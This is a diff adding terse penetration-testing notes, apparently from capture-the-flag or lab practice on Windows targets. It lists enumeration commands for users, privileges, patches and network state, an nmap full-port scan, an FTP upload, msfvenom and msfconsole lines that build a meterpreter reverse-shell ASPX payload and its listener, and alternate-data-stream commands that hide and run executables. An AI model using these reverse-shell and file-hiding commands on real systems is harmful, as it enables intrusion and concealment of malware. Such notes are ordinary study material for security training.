@@ -16,3 +16,65 @@ gdb checkset
 x/s memory addr
 strings -h
 https://www.cameronwickes.co.uk/stack-alignment-ubuntu-18-04-movaps
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+systeminfo
+whoami
+set (get env variables)
+echo %<env variable name>%
+where <exe file name>
+help <command>
+<command>/?
+cls
+------
+cd
+dir
+dir /A
+mkdir 
+type NUL > <name new file>
+echo "some content" > <name new file>
+-------
+whoami /groups
+whoami /priv
+net accounts
+net user
+net user <user namer>
+icacls <file name>
+-------
+ipconfig /ALL
+route print
+netstat -ao
+
+##############################################à
+https://learn.microsoft.com/en-us/sysinternals/downloads/
+https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite
+https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer
+##############################################à
+nmap -A -T4 -p- <ip>
+ftp <ip>; put <file>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local ip> LPORT=<local port> -f aspx > exploit.aspx
+msfconsole; use exploit/multi/handler; options; set payload windows/meterpreter/reverse_tcp; options; set lhost tun0; run
+
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+systeminfo | findstr /B /C:"Nome SO" /C:"Versione OS"
+
+wmic qfe
+
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+
+wmic logicaldisk
+wmic logicaldisk get caption,description,providername
+
+whoami
+whoami /priv
+whoami /groups
+net user
+net user <user name>
+net localgroup
+net localgroup <groupname>
+
+
+type c:\tmp\putty.exe > "C:\tmp\filedilog.log:pt.exe
+
+cmd.exe - < fakefile.doc:reg32.bat
+
+type C:\windows\system32\notepad.exe > C:\tmp\loadimages\calc.txt:notepad.exe
